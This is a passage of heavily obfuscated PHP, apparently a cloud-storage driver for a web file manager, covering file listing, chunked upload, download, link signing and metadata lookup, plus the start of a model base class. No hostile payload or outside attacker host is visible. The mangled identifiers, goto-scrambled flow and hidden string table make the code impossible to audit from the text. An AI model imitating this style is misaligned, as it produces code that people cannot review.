$this->ussRequest($dšáº·, $dğ˜Ä¥´Î[210], !1, $bƒ‰˜Äò±Ñ); return $Aí÷ÚçµÍ‹[$dğ˜Ä¥´Î[1035]] ? !0 : !1; } public function delFile($c¬¶× …Åˆ) { $DÀ‘ì´’ø¿ =& $_SERVER[Õİõş]; $Få²ÄµøÄ… = $this->ussRequest($c¬¶× …Åˆ, $DÀ‘ì´’ø¿[1246]); return $Få²ÄµøÄ…[$DÀ‘ì´’ø¿[1035]] ? !0 : !1; } public function delFolder($fˆ¡¸Ñù²) { $a‘ ¢‚•Œø =& $_SERVER[Õİõş]; $fÄŸ˜Ëö¹ = $this->listAll($fˆ¡¸Ñù²); krsort($fÄŸ˜Ëö¹); foreach ($fÄŸ˜Ëö¹ as $E•Ğå“²á§) { $this->ussRequest($E•Ğå“²á§[$a‘ ¢‚•Œø[75]], $a‘ ¢‚•Œø[1246]); } return $this->ussRequest($fˆ¡¸Ñù², $a‘ ¢‚•Œø[1246]); } public function rename($aƒòÍ³Ä“, $aÌ…œ÷Û©ô) { if ($this->isFile($aƒòÍ³Ä“)) { $aÌ…œ÷Û©ô = get_path_father($aƒòÍ³Ä“) . $aÌ…œ÷Û©ô; return $this->moveFile($aƒòÍ³Ä“, $aÌ…œ÷Û©ô); } return $this->renameObject($aƒòÍ³Ä“, $aÌ…œ÷Û©ô); } public function fileInfo($Fèß˜Ùëã…, $aà™×˜œ«¸ = false, $EË­›ÙÙöŒ = array()) { $Fœ¯ô¿Şôš =& $_SERVER[Õİõş]; if ($aà™×˜œ«¸) { return array($Fœ¯ô¿Şôš[28] => $this->pathThis($Fèß˜Ùëã…), $Fœ¯ô¿Şôš[75] => $this->getPathOuter($Fœ¯ô¿Şôš[8] . $Fèß˜Ùëã…), $Fœ¯ô¿Şôš[29] => $Fœ¯ô¿Şôš[163], $Fœ¯ô¿Şôš[77] => isset($EË­›ÙÙöŒ[$Fœ¯ô¿Şôš[321]]) ? $EË­›ÙÙöŒ[$Fœ¯ô¿Şôš[321]] : 0, $Fœ¯ô¿Şôš[156] => $this->ext($Fèß˜Ùëã…)); } $bå¸—Ïª§» = array($Fœ¯ô¿Şôš[28] => $this->pathThis($Fèß˜Ùëã…), $Fœ¯ô¿Şôš[75] => $this->getPathOuter($Fœ¯ô¿Şôš[8] . $Fèß˜Ùëã…), $Fœ¯ô¿Şôš[29] => $Fœ¯ô¿Şôš[163], $Fœ¯ô¿Şôš[183] => 0, $Fœ¯ô¿Şôš[106] => isset($E®ÌÊ•ª[$Fœ¯ô¿Şôš[1247]]) ? $E®ÌÊ•ª[$Fœ¯ô¿Şôš[1247]] : 0, $Fœ¯ô¿Şôš[77] => isset($EË­›ÙÙöŒ[$Fœ¯ô¿Şôš[321]]) ? $EË­›ÙÙöŒ[$Fœ¯ô¿Şôš[321]] : 0, $Fœ¯ô¿Şôš[156] => $this->ext($Fèß˜Ùëã…), $Fœ¯ô¿Şôš[184] => !0, $Fœ¯ô¿Şôš[185] => !0); if (empty($EË­›ÙÙöŒ)) { $EË­›ÙÙöŒ = $this->objectMeta($Fèß˜Ùëã…); if (!$EË­›ÙÙöŒ) { return $bå¸—Ïª§»; } $bå¸—Ïª§»[$Fœ¯ô¿Şôš[183]] = $EË­›ÙÙöŒ[$Fœ¯ô¿Şôš[1248]]; $bå¸—Ïª§»[$Fœ¯ô¿Şôš[106]] = $EË­›ÙÙöŒ[$Fœ¯ô¿Şôš[1249]]; $bå¸—Ïª§»[$Fœ¯ô¿Şôš[77]] = $EË­›ÙÙöŒ[$Fœ¯ô¿Şôš[77]]; } return $bå¸—Ïª§»; } public function folderInfo($EÓæº©å¢, $BÆì—„åÚ = false) { $BÓ³‰‹æ® =& $_SERVER[Õİõş]; if ($BÆì—„åÚ) { return array($BÓ³‰‹æ®[28] => $this->pathThis($EÓæº©å¢), $BÓ³‰‹æ®[75] => $this->getPathOuter($BÓ³‰‹æ®[8] . $EÓæº©å¢), $BÓ³‰‹æ®[29] => $BÓ³‰‹æ®[76]); } $a£Öº»ñ‡¥ = array($BÓ³‰‹æ®[28] => $this->pathThis($EÓæº©å¢), $BÓ³‰‹æ®[75] => $this->getPathOuter($BÓ³‰‹æ®[8] . $EÓæº©å¢), $BÓ³‰‹æ®[29] => $BÓ³‰‹æ®[76], $BÓ³‰‹æ®[183] => 0, $BÓ³‰‹æ®[106] => isset($Dªœ§·ÊĞ[$BÓ³‰‹æ®[1247]]) ? $Dªœ§·ÊĞ[$BÓ³‰‹æ®[1247]] : 0, $BÓ³‰‹æ®[1157] => !0, $BÓ³‰‹æ®[1158] => !0); if (empty($e­˜Ş¤ªĞ‹)) { $e­˜Ş¤ªĞ‹ = $this->objectMeta($EÓæº©å¢); if (!$e­˜Ş¤ªĞ‹) { return $a£Öº»ñ‡¥; } $a£Öº»ñ‡¥[$BÓ³‰‹æ®[183]] = $e­˜Ş¤ªĞ‹[$BÓ³‰‹æ®[1248]]; $a£Öº»ñ‡¥[$BÓ³‰‹æ®[106]] = $e­˜Ş¤ªĞ‹[$BÓ³‰‹æ®[1249]]; } return $a£Öº»ñ‡¥; } private function fileList($b×Ä áèÅ•, $b¾ØÜçŸÚÄ = 0, $E‘äìïÊÅÙ = 1000) { $f®³¡¾ßÉà =& $_SERVER[Õİõş]; $FêâÇˆ‹ˆì = array($f®³¡¾ßÉà[1250], $f®³¡¾ßÉà[1251] . $E‘äìïÊÅÙ); if ($b¾ØÜçŸÚÄ) { $FêâÇˆ‹ˆì[] = $f®³¡¾ßÉà[1252] . $b¾ØÜçŸÚÄ; } $fŞšîÜƒ„è = $this->ussRequest($b×Ä áèÅ•, $f®³¡¾ßÉà[212], !1, $FêâÇˆ‹ˆì); return !$fŞšîÜƒ„è[$f®³¡¾ßÉà[1035]] ? !1 : $fŞšîÜƒ„è[$f®³¡¾ßÉà[1037]]; } public function listPath($eİ°ºö¡á, $D¯Îµ¿Âö˜ = false) { goto dÂõãÂç; E¤£…ëµŞ¾: return array($dÄÓÕâ„Âš[74] => $BÉÉĞº¼, $dÄÓÕâ„Âš[73] => $DÎºª—×â†); goto C·¸Ú†¨·³; dÂõãÂç: $dÄÓÕâ„Âš =& $_SERVER[Õİõş]; $Cºõ©™·êÒ = $dÄÓÕâ„Âš[33]; $c‰‡Ô“ë—… = 1000; goto BéÃ“¾Â¸Ä; BéÃ“¾Â¸Ä: $BÉÉĞº¼ = $DÎºª—×â† = array(); $Dëï÷š˜Ä¦ = rtrim($eİ°ºö¡á, $dÄÓÕâ„Âš[8]) . $dÄÓÕâ„Âš[8]; while (!0) { $a½Ç¾•ã = $this->fileList($eİ°ºö¡á, $Cºõ©™·êÒ, $c‰‡Ô“ë—…); if (!$a½Ç¾•ã) { return !1; } $Cºõ©™·êÒ = isset($a½Ç¾•ã[$dÄÓÕâ„Âš[1253]]) ? $a½Ç¾•ã[$dÄÓÕâ„Âš[1253]] : $dÄÓÕâ„Âš[33]; $bÇ£­ÁßÓ = isset($a½Ç¾•ã[$dÄÓÕâ„Âš[1254]]) ? $a½Ç¾•ã[$dÄÓÕâ„Âš[1254]] : array(); foreach ($bÇ£­ÁßÓ as $cğ‚‰à­ä‡) { if ($cğ‚‰à­ä‡[$dÄÓÕâ„Âš[29]] == $dÄÓÕâ„Âš[76]) { $BÉÉĞº¼[] = $this->folderInfo($Dëï÷š˜Ä¦ . $cğ‚‰à­ä‡[$dÄÓÕâ„Âš[28]], $D¯Îµ¿Âö˜, $cğ‚‰à­ä‡); } else { $DÎºª—×â†[] = $this->fileInfo($Dëï÷š˜Ä¦ . $cğ‚‰à­ä‡[$dÄÓÕâ„Âš[28]], $D¯Îµ¿Âö˜, $cğ‚‰à­ä‡); } } if (count($bÇ£­ÁßÓ) < $c‰‡Ô“ë—…) { break; } } goto E¤£…ëµŞ¾; C·¸Ú†¨·³: } private function recursionAllFiles($eœ³ÃİƒÄ÷, &$b¼«›×—æ¿) { $C™ßé®§Ç =& $_SERVER[Õİõş]; $FáÜÓíÌ = $C™ßé®§Ç[33]; $dªÀ¯‘Äç = 1000; $eñ–óÎ˜æ = $c—Ö¹ä¡º = array(); $c¡ßª£ÊÙâ = rtrim($eœ³ÃİƒÄ÷, $C™ßé®§Ç[8]) . $C™ßé®§Ç[8]; while (!0) { $a™ÂÇ¦Ïó± = $this->fileList($eœ³ÃİƒÄ÷, $FáÜÓíÌ, $dªÀ¯‘Äç); if (!$a™ÂÇ¦Ïó±) { return !1; } $FáÜÓíÌ = isset($a™ÂÇ¦Ïó±[$C™ßé®§Ç[1253]]) ? $a™ÂÇ¦Ïó±[$C™ßé®§Ç[1253]] : $C™ßé®§Ç[33]; $FØøÑ¼Š¯ô = isset($a™ÂÇ¦Ïó±[$C™ßé®§Ç[1254]]) ? $a™ÂÇ¦Ïó±[$C™ßé®§Ç[1254]] : array(); foreach ($FØøÑ¼Š¯ô as $cë‘Â³…ã) { $AÀæ±´Šğô = array($C™ßé®§Ç[75] => $c¡ßª£ÊÙâ . $cë‘Â³…ã[$C™ßé®§Ç[28]], $C™ßé®§Ç[76] => $cë‘Â³…ã[$C™ßé®§Ç[29]] == $C™ßé®§Ç[76] ? 1 : 0, $C™ßé®§Ç[77] => isset($cë‘Â³…ã[$C™ßé®§Ç[321]]) ? $cë‘Â³…ã[$C™ßé®§Ç[321]] : 0); $b¼«›×—æ¿[] = $AÀæ±´Šğô; if ($AÀæ±´Šğô[$C™ßé®§Ç[76]] == 1) { $this->recursionAllFiles($AÀæ±´Šğô[$C™ßé®§Ç[75]], $b¼«›×—æ¿); } } if (count($FØøÑ¼Š¯ô) < $dªÀ¯‘Äç) { break; } } } public function has($C²ŠŠÆÙãŞ, $dº“ÌÎ¯˜ = false, $A¡·À—äìË = true) { goto EÂÉ·¬é; C¦‘·¬·Š¿: while (!0) { $a¢´—¡¤ä« = $this->fileList($C²ŠŠÆÙãŞ, $E …ˆ±õğÀ, $F¢Ò…äİé); if (!$a¢´—¡¤ä«) { return !1; } $E …ˆ±õğÀ = isset($a¢´—¡¤ä«[$f§²ÃÖ‘İ×[1253]]) ? $a¢´—¡¤ä«[$f§²ÃÖ‘İ×[1253]] : $f§²ÃÖ‘İ×[33]; $D‘šßß÷‡Æ = isset($a¢´—¡¤ä«[$f§²ÃÖ‘İ×[1254]]) ? $a¢´—¡¤ä«[$f§²ÃÖ‘İ×[1254]] : array(); if (empty($D‘šßß÷‡Æ)) { break; } $d¼¤§†Şù = array_to_keyvalue($D‘šßß÷‡Æ, $f§²ÃÖ‘İ×[33], $f§²ÃÖ‘İ×[29]); $BŠ‰³‡÷‚ë = array_count_values($d¼¤§†Şù); $fï¨ç“ÕìÃ = isset($BŠ‰³‡÷‚ë[$f§²ÃÖ‘İ×[76]]) ? $BŠ‰³‡÷‚ë[$f§²ÃÖ‘İ×[76]] : 0; $Eë…ÂÅÙÒÒ = count($d¼¤§†Şù) - $fï¨ç“ÕìÃ; if ($dº“ÌÎ¯˜) { $c¢«ëƒ¬½’ += $fï¨ç“ÕìÃ; $A•íÓ¸›“¤ += $Eë…ÂÅÙÒÒ; if ($D¿ŞŠ¹³¢Ë < $F¢Ò…äİé) { break; } continue; } if ($A¡·À—äìË) { if ($Eë…ÂÅÙÒÒ) { return !0; } } else { if ($fï¨ç“ÕìÃ) { return !0; } } if (count($D‘šßß÷‡Æ) < $F¢Ò…äİé) { break; } } if ($dº“ÌÎ¯˜) { return array($f§²ÃÖ‘İ×[187] => $A•íÓ¸›“¤, $f§²ÃÖ‘İ×[188] => $c¢«ëƒ¬½’); } return !1; goto fõ¡Ô×›«Ú; EÂÉ·¬é: $f§²ÃÖ‘İ× =& $_SERVER[Õİõş]; $E …ˆ±õğÀ = $f§²ÃÖ‘İ×[33]; $F¢Ò…äİé = 1000; goto c¬Ó÷Ì‰‹; c¬Ó÷Ì‰‹: $A•íÓ¸›“¤ = 0; $c¢«ëƒ¬½’ = 0; $d¦ãšÃ» = rtrim($C²ŠŠÆÙãŞ, $f§²ÃÖ‘İ×[8]) . $f§²ÃÖ‘İ×[8]; goto C¦‘·¬·Š¿; fõ¡Ô×›«Ú: } public function listAll($D«öÚĞ·’Â) { $d‘¤†ëÖœ˜ = array(); $this->recursionAllFiles($D«öÚĞ·’Â, $d‘¤†ëÖœ˜); return $d‘¤†ëÖœ˜; } public function canRead($D…‚¸ª¤éŠ) { return $this->exist($D…‚¸ª¤éŠ) ? !0 : !1; } public function canWrite($båêÑŞÅ„) { return $this->exist($båêÑŞÅ„) ? !0 : !1; } public function getContent($F¡«ĞÊø¼) { return $this->fileSubstr($F¡«ĞÊø¼, 0, -1); } public function setContent($AÛí’ö´ß, $Díæ°¶Ü‡Š = '') { $d†¶†¬²ŒÁ =& $_SERVER[Õİõş]; if (!$Díæ°¶Ü‡Š) { $Cóç×¬®Ò = $this->ussRequest($AÛí’ö´ß, $d†¶†¬²ŒÁ[208]); return $Cóç×¬®Ò[$d†¶†¬²ŒÁ[1035]]; } $dõİâ«• = $this->tempFile($this->pathThis($AÛí’ö´ß)); file_put_contents($dõİâ«•, $Díæ°¶Ü‡Š); if ($this->upload($AÛí’ö´ß, $dõİâ«•)) { $this->tempFileRemve($dõİâ«•); return !0; } return !1; } public function fileSubstr($CŒµ–÷¢”ø, $eÈÃ½æéÉÈ, $a»…­“—Š¡) { $cÊŠÖ’‹“å =& $_SERVER[Õİõş]; if (!($a®®ÌğØ“³ = $this->link($CŒµ–÷¢”ø))) { return !1; } $a–™Š´ìÃ = !1; if ($a»…­“—Š¡ > 0) { $a”œø›Ÿ‚ = $eÈÃ½æéÉÈ + $a»…­“—Š¡ - 1; $a–™Š´ìÃ = array($cÊŠÖ’‹“å[1215] . $eÈÃ½æéÉÈ . $cÊŠÖ’‹“å[407] . $a”œø›Ÿ‚); } $b¯áë“œ‰Ç = url_request($a®®ÌğØ“³, $cÊŠÖ’‹“å[212], !1, $a–™Š´ìÃ); return $b¯áë“œ‰Ç[$cÊŠÖ’‹“å[691]] ? $b¯áë“œ‰Ç[$cÊŠÖ’‹“å[1037]] : !1; } public function upload($dÁçŠ¾¸¼´, $Cóí®»ÈÜ, $b£§è¶™ßœ = false, $f¡§ƒáœ£ = REPEAT_REPLACE) { goto B˜õôƒå; C’à‘ĞŠ²Æ: $f‘¶í¨»‰ = $this->ussRequest($dÁçŠ¾¸¼´, $EùÒôåÖ„Í[210], !1, $e ø»); return $f‘¶í¨»‰[$EùÒôåÖ„Í[1035]] ? $this->getPathOuter($Bæğ†‡Á§Š) : !1; goto b»®Ø‹¸Ÿ; CÈ¾“Ğó¸: do { $f„˜¡¾´Šâ = $DèñğÖ§ßÑ[$EùÒôåÖ„Í[1261]]; fseek($aŠ’Âšõ§â, $Fö™ùÁšÌä); $fâ¬ïøÊÈ = fread($aŠ’Âšõ§â, $f„˜¡¾´Šâ); $d®Ñ‡å†Ì = 0; do { $d®Ñ‡å†Ì++; $DèñğÖ§ßÑ = $this->uploadPart($dÁçŠ¾¸¼´, $DèñğÖ§ßÑ, $fâ¬ïøÊÈ); } while (!$DèñğÖ§ßÑ && $d®Ñ‡å†Ì < 3); if (!$DèñğÖ§ßÑ) { return !1; } $F·Çã«åõ„ = $DèñğÖ§ßÑ[$EùÒôåÖ„Í[1260]]; $Fö™ùÁšÌä += $f„˜¡¾´Šâ; } while ($F·Çã«åõ„ != -1); fclose($aŠ’Âšõ§â); $e ø» = array($EùÒôåÖ„Í[1262], $EùÒôåÖ„Í[1263] . $DèñğÖ§ßÑ[$EùÒôåÖ„Í[1264]], $EùÒôåÖ„Í[1258]); goto C’à‘ĞŠ²Æ; B˜õôƒå: $EùÒôåÖ„Í =& $_SERVER[Õİõş]; $BŒÙ¸± „¾ = IO::size($Cóí®»ÈÜ); if ($BŒÙ¸± „¾ <= 1024 * 1024 * 200) { $B¥îƒŠ“Åµ = array($EùÒôåÖ„Í[1255] . $Cóí®»ÈÜ); $f‘¶í¨»‰ = $this->ussRequest($dÁçŠ¾¸¼´, $EùÒôåÖ„Í[210], $B¥îƒŠ“Åµ); return $f‘¶í¨»‰[$EùÒôåÖ„Í[1035]] ? $this->getPathOuter($dÁçŠ¾¸¼´) : !1; } goto dÀÌ Œ’; dÀÌ Œ’: $d›œ­£åÓ… = 1024 * 1024 * 10; $e ø» = array($EùÒôåÖ„Í[1256], $EùÒôåÖ„Í[1257] . $BŒÙ¸± „¾, $EùÒôåÖ„Í[1258], $EùÒôåÖ„Í[1259] . $d›œ­£åÓ…); $f‘¶í¨»‰ = $this->ussRequest($dÁçŠ¾¸¼´, $EùÒôåÖ„Í[210], !1, $e ø»); goto Dç¦±ãß°; FÎ”˜÷µŸÊ: $F·Çã«åõ„ = $DèñğÖ§ßÑ[$EùÒôåÖ„Í[1260]]; $aŠ’Âšõ§â = fopen($Cóí®»ÈÜ, $EùÒôåÖ„Í[1165]); if (!$aŠ’Âšõ§â) { return !1; } goto CÈ¾“Ğó¸; Dç¦±ãß°: if (!$f‘¶í¨»‰[$EùÒôåÖ„Í[1035]]) { return !1; } $DèñğÖ§ßÑ = $f‘¶í¨»‰[$EùÒôåÖ„Í[1037]]; $Fö™ùÁšÌä = 0; goto FÎ”˜÷µŸÊ; b»®Ø‹¸Ÿ: } private function uploadPart($E‰ïÏóÔ²¡, $d·«‹Ô´Å‚, &$e‚’ª¥Ûˆ) { $f‰¶ŒáÀ‹Ÿ =& $_SERVER[Õİõş]; $e¿Ô¯óº»Š = array($f‰¶ŒáÀ‹Ÿ[1265], $f‰¶ŒáÀ‹Ÿ[1263] . $d·«‹Ô´Å‚[$f‰¶ŒáÀ‹Ÿ[1264]], $f‰¶ŒáÀ‹Ÿ[1266] . $d·«‹Ô´Å‚[$f‰¶ŒáÀ‹Ÿ[1260]], $f‰¶ŒáÀ‹Ÿ[1267] . $d·«‹Ô´Å‚[$f‰¶ŒáÀ‹Ÿ[1261]]); $A™•’§î = $this->ussRequest($E‰ïÏóÔ²¡, $f‰¶ŒáÀ‹Ÿ[210], $e‚’ª¥Ûˆ, $e¿Ô¯óº»Š); return !$A™•’§î[$f‰¶ŒáÀ‹Ÿ[1035]] ? $A™•’§î[$f‰¶ŒáÀ‹Ÿ[1035]] : $A™•’§î[$f‰¶ŒáÀ‹Ÿ[1037]]; } public function uploadFormData($E¦Ğøì¿èè, $bãô„çÎ£ = 3600) { return $this->uploadPolicy($E¦Ğøì¿èè, $bãô„çÎ£); } public function multiUploadFormData($bòª‘“·ˆ¯, $FØÖíÊÊë¹ = 3600) { $e½Ô©ŒŸ½© =& $_SERVER[Õİõş]; $f…Š³×¨¤ô = (int) $GLOBALS[$e½Ô©ŒŸ½©[7]][$e½Ô©ŒŸ½©[77]]; return $this->uploadPolicy($bòª‘“·ˆ¯, $FØÖíÊÊë¹, $f…Š³×¨¤ô); } private function uploadPolicy($fğíƒ¡Ÿ, $cƒÃ´â¢ì = 3600, $D£®Í‘¾ª¸ = 0) { goto C…¡‡ò¾š; C…¡‡ò¾š: $AÇ£ÊòÇ†¶ =& $_SERVER[Õİõş]; $fŠøÑß˜ÌÚ = $AÇ£ÊòÇ†¶[8] . $this->bucket; $cºÍÁŸÖ²ò = gmdate($AÇ£ÊòÇ†¶[1200]); goto cÛŸãµŞï; aÒéÏŠÆå›: $fëÇßø„¶† = base64_encode(hash_hmac($AÇ£ÊòÇ†¶[1237], "\120\x4f\x53\124\46{$fŠøÑß˜ÌÚ}\46{$cºÍÁŸÖ²ò}\x26{$F›®™¥‰Š}", md5("{$this->userpass}"), !0)); $Cñ±—Éã¦¥ = array($AÇ£ÊòÇ†¶[1108] => $F›®™¥‰Š, $AÇ£ÊòÇ†¶[1272] => "\125\x50\x59\125\x4e\x20{$this->username}\x3a{$fëÇßø„¶†}", $AÇ£ÊòÇ†¶[165] => $this->endpoint . $fŠøÑß˜ÌÚ); return $Cñ±—Éã¦¥; goto d² ¨­›ŞØ; cÛŸãµŞï: $D£š“Û‘À = array($AÇ£ÊòÇ†¶[1268] => $this->bucket, $AÇ£ÊòÇ†¶[1269] => $fğíƒ¡Ÿ, $AÇ£ÊòÇ†¶[1270] => time() + $cƒÃ´â¢ì, $AÇ£ÊòÇ†¶[1271] => $cºÍÁŸÖ²ò); if ($D£®Í‘¾ª¸) { $D£š“Û‘À[$AÇ£ÊòÇ†¶[1186]] = $D£®Í‘¾ª¸; } $F›®™¥‰Š = base64_encode(json_encode($D£š“Û‘À)); goto aÒéÏŠÆå›; d² ¨­›ŞØ: } public function download($CöÙˆ«Àñ›, $f¾‚²×Ø³) { goto DíÀåØÇÊí; aÎô© œğ: fclose($dİŸ–¾Ü¤“); return $f¾‚²×Ø³; goto BâçÛ¹‰®ã; bô¯´‚å‹: $a«ÙÉÃ¼¥¹ = 1024 * 200; $dİŸ–¾Ü¤“ = fopen($BöÂßõ—¢ê, $_SERVER[Õİõş][1221]); while (!0) { $C°·”­š‡ = $this->fileSubstr($CöÙˆ«Àñ›, $b¸×š˜Ô·, $a«ÙÉÃ¼¥¹); if ($C°·”­š‡ === !1) { return !1; } fwrite($dİŸ–¾Ü¤“, $C°·”­š‡); $b¸×š˜Ô· += $a«ÙÉÃ¼¥¹; if (strlen($C°·”­š‡) < $a«ÙÉÃ¼¥¹) { break; } } goto aÎô© œğ; DíÀåØÇÊí: $BöÂßõ—¢ê = IO::getPathInner(IO::mkfile($f¾‚²×Ø³)); if (!($b–ä‹ïõÁ‘ = $this->link($CöÙˆ«Àñ›))) { return !1; } $b¸×š˜Ô· = 0; goto bô¯´‚å‹; BâçÛ¹‰®ã: } public function link($b•ÂèÇíƒÛ, $EÉÌÄ„ßƒ = array()) { $Cåë±ÎŞö =& $_SERVER[Õİõş]; $b•ÂèÇíƒÛ = trim($b•ÂèÇíƒÛ, $Cåë±ÎŞö[8]); if (!empty($this->token)) { $DŒ›µÛäºç = strtotime(date($Cåë±ÎŞö[1273])); $DÅÕïšÙì = substr(md5($this->token . $Cåë±ÎŞö[268] . $DŒ›µÛäºç . $Cåë±ÎŞö[1274] . $b•ÂèÇíƒÛ), 12, 8) . $DŒ›µÛäºç; $EÉÌÄ„ßƒ[] = $Cåë±ÎŞö[1275] . $DÅÕïšÙì; } $bĞÇ÷ÓÆ¤À = !empty($EÉÌÄ„ßƒ) ? $Cåë±ÎŞö[69] . implode($Cåë±ÎŞö[268], $EÉÌÄ„ßƒ) : $Cåë±ÎŞö[33]; return $this->getHost() . $Cåë±ÎŞö[8] . $b•ÂèÇíƒÛ . $bĞÇ÷ÓÆ¤À; } public function fileOut($fÈÏ²Š³Û¿, $eÌ­Â¯à¾Ø = false, $Aäõ’³è°© = false, $DÍ´¸ìäò¸ = '') { if (!$Aäõ’³è°©) { $Aäõ’³è°© = $this->pathThis($fÈÏ²Š³Û¿); } $DËÂ‘ èô = $eÌ­Â¯à¾Ø ? array($_SERVER[Õİõş][1276] . rawurlencode($Aäõ’³è°©)) : array(); $AÕ”„ÂÕ‘ = $this->link($fÈÏ²Š³Û¿, $DËÂ‘ èô); $this->fileOutLink($AÕ”„ÂÕ‘); } public function fileOutServer($f«ùòİê˜ö, $DæùíÔŠ‹¶ = false, $BŸÆ¥ƒ÷â‚ = false, $Bøé•ãƒ÷¼ = '') { parent::fileOut($f«ùòİê˜ö, $DæùíÔŠ‹¶, $BŸÆ¥ƒ÷â‚, $Bøé•ãƒ÷¼); } public function fileOutImage($c±Ç¸‹·éÅ, $B‡‰Öì¦‚‰ = 250) { $C¤Ø¦»ó´Á = $this->link($c±Ç¸‹·éÅ . $_SERVER[Õİõş][1277] . $B‡‰Öì¦‚‰); $this->fileOutLink($C¤Ø¦»ó´Á); } public function fileOutImageServer($E´ê¹ÕŞÎ¯, $Aæ¡ğîæù„ = 250) { parent::fileOutImage($E´ê¹ÕŞÎ¯, $Aæ¡ğîæù„); } public function hashMd5($d·‹è‹“ºğ) { $EñĞ˜Âµ§» =& $_SERVER[Õİõş]; $fËÅÉÜÜ‹ù = $this->objectMeta($d·‹è‹“ºğ); return isset($fËÅÉÜÜ‹ù[$EñĞ˜Âµ§»[192]]) ? $fËÅÉÜÜ‹ù[$EñĞ˜Âµ§»[192]] : !1; } public function size($fÌÒ”»¦à) { $Dô„¿ğ‰¿ä = $this->objectMeta($fÌÒ”»¦à); return $Dô„¿ğ‰¿ä ? $Dô„¿ğ‰¿ä[$_SERVER[Õİõş][77]] : 0; } public function info($e½¶šÄØİø) { if ($this->isFolder($e½¶šÄØİø)) { return $this->folderInfo($e½¶šÄØİø); } else { if ($this->isFile($e½¶šÄØİø)) { return $this->fileInfo($e½¶šÄØİø); } } return !1; } public function exist($dœæÉƒºÆ) { return $this->isFile($dœæÉƒºÆ) || $this->isFolder($dœæÉƒºÆ); } public function isFile($A—ª©—†§Ì) { return !$this->isFolder($A—ª©—†§Ì) && $this->objectMeta($A—ª©—†§Ì); } public function isFolder($d™ö˜æÕ¸Í) { return $this->cacheMethod($_SERVER[Õİõş][219], $d™ö˜æÕ¸Í); } protected function objectMeta($D¯æÈ±ÔÒ) { return $this->cacheMethod($_SERVER[Õİõş][220], $D¯æÈ±ÔÒ); } protected function _objectMeta($E—ë•ˆÚ·) { goto a¼œ‚ìƒ‘; fœÎ‹‘†‡’: $bæ´Ù¬É¯„ = array($Dƒ™¾¶Ş[28] => get_path_this($E—ë•ˆÚ·), $Dƒ™¾¶Ş[29] => isset($Aƒö»»Íº[$Dƒ™¾¶Ş[1279]]) ? $Aƒö»»Íº[$Dƒ™¾¶Ş[1279]] : null, $Dƒ™¾¶Ş[77] => isset($Aƒö»»Íº[$Dƒ™¾¶Ş[1280]]) ? $Aƒö»»Íº[$Dƒ™¾¶Ş[1280]] : null, $Dƒ™¾¶Ş[192] => isset($Aƒö»»Íº[$Dƒ™¾¶Ş[1281]]) ? $Aƒö»»Íº[$Dƒ™¾¶Ş[1281]] : null, $Dƒ™¾¶Ş[1248] => isset($Aƒö»»Íº[$Dƒ™¾¶Ş[1282]]) ? $Aƒö»»Íº[$Dƒ™¾¶Ş[1282]] : null); $bæ´Ù¬É¯„[$Dƒ™¾¶Ş[1249]] = isset($Aƒö»»Íº[$Dƒ™¾¶Ş[1283]]) ? strtotime($Aƒö»»Íº[$Dƒ™¾¶Ş[1283]]) : $bæ´Ù¬É¯„[$Dƒ™¾¶Ş[1248]]; return $bæ´Ù¬É¯„; goto EÓïØêñä; a¼œ‚ìƒ‘: $Dƒ™¾¶Ş =& $_SERVER[Õİõş]; if ($E—ë•ˆÚ· == $Dƒ™¾¶Ş[33] || $E—ë•ˆÚ· == $Dƒ™¾¶Ş[8]) { return array(); } $A‚ì÷ªóÛ¿ = $this->ussRequest($E—ë•ˆÚ·, $Dƒ™¾¶Ş[1278]); goto fƒ’¨Ì”ƒ÷; fƒ’¨Ì”ƒ÷: if (!$A‚ì÷ªóÛ¿[$Dƒ™¾¶Ş[1035]]) { return null; } $Aƒö»»Íº = isset($A‚ì÷ªóÛ¿[$Dƒ™¾¶Ş[1037]]) ? $A‚ì÷ªóÛ¿[$Dƒ™¾¶Ş[1037]] : array(); if (!isset($Aƒö»»Íº[$Dƒ™¾¶Ş[1279]])) { return null; } goto fœÎ‹‘†‡’; EÓïØêñä: } protected function _isFolder($e®¾ÓŠÑÜ”) { $d¹ÒÕ²Ö¶Ó =& $_SERVER[Õİõş]; if ($e®¾ÓŠÑÜ” == $d¹ÒÕ²Ö¶Ó[33] || $e®¾ÓŠÑÜ” == $d¹ÒÕ²Ö¶Ó[8]) { return !0; } $f¼Œ É£˜ø = $this->objectMeta($e®¾ÓŠÑÜ”); return isset($f¼Œ É£˜ø[$d¹ÒÕ²Ö¶Ó[29]]) && $f¼Œ É£˜ø[$d¹ÒÕ²Ö¶Ó[29]] == $d¹ÒÕ²Ö¶Ó[76] ? !0 : !1; } } goto b™–’óáÚ‚; bøˆ²â®‘ì: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\x54\x69\155\145", "\164\x69\x6d\145", "\151\156\x73\x65\162\164\54\x75\160\x64\141\x74\145", "\x66\x75\156\143\164\x69\x6f\x6e"), array("\143\162\145\141\x74\x65\124\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\x65\162\164", "\x66\165\156\x63\x74\x69\157\x6e")); public function setDataAuto($DŞ¤Å¡µ™î) { $this->dataAuto = $DŞ¤Å¡µ™î; } public function __construct($dÓå¯­îêõ = '', $B¿Œ¦Í…ñ§ = '', $fì˜ˆäÍÇ = '') { parent::__construct($dÓå¯­îêõ, $B¿Œ¦Í…ñ§, $fì˜ˆäÍÇ); } public static function textEncode($EÌ„­ëÄ’ñ) { if (!$EÌ„­ëÄ’ñ) { return $EÌ„­ëÄ’ñ; } $dÊá¸¹Åå = json_encode($EÌ„­ëÄ’ñ); $dÊá¸¹Åå = preg_replace_callback($_SERVER[Õİõş][338], function ($A±½Š½Œêà) { return addslashes($A±½Š½Œêà[0]); }, $dÊá¸¹Åå); return json_decode($dÊá¸¹Åå); } public static function textDecode($CëøÔÙõë) { $EÖ“Ÿİ£µÌ =& $_SERVER[Õİõş]; $a¤Ğ—›ğ°” = json_encode($CëøÔÙõë); $a¤Ğ—›ğ°” = preg_replace_callback($EÖ“Ÿİ£µÌ[339], function ($cø èÎ Œ‰) { return $_SERVER[Õİõş][93]; }, $a¤Ğ—›ğ°”); return json_decode($a¤Ğ—›ğ°”); } protected $tableMeta = array(); protected function _beforeInsert(&$B¯ˆÌ¸ø, $Cá´ÖÊ¢·) { $d”¨Â–æ¤ =& $_SERVER[Õİõş]; if (!$this->checkDataAutoHas($d”¨Â–æ¤[340])) { return; } $this->dataBeforeFilter($B¯ˆÌ¸ø, $d”¨Â–æ¤[340]); } protected function 